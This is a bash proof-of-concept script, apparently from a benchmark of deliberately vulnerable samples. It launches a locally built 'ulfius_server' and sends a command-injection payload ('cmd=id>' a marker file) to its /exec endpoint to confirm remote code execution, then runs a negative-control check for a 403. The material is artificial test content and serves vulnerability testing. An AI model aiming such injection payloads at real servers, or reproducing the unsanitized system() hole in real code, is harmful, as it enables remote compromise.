#!/usr/bin/env bash
# PoC for 104_ulfius_C2I2S1
# Axes: C2 (two CLI flags + struct) / I2 (snprintf buffer then system()) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (ulfius_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/ulfius_server"
WWWROOT="/tmp/poc_104_www"
MARKER="/tmp/poc_104_marker"
PORT=18104

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server with both C2 gates ────────────────────────────────────────────
echo "[*] starting ulfius_server with --exec-enabled --diag-enabled on port $PORT..."
"$BINARY" --port "$PORT" --exec-enabled --diag-enabled &
SERVER_PID=$!
sleep 0.4

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint returns 403 with only one flag ──────────────────
echo "[*] verifying gate: endpoint must return 403 with only --exec-enabled..."
NEG_PORT=19104
"$BINARY" --port "$NEG_PORT" --exec-enabled &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 with only one C2 flag"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
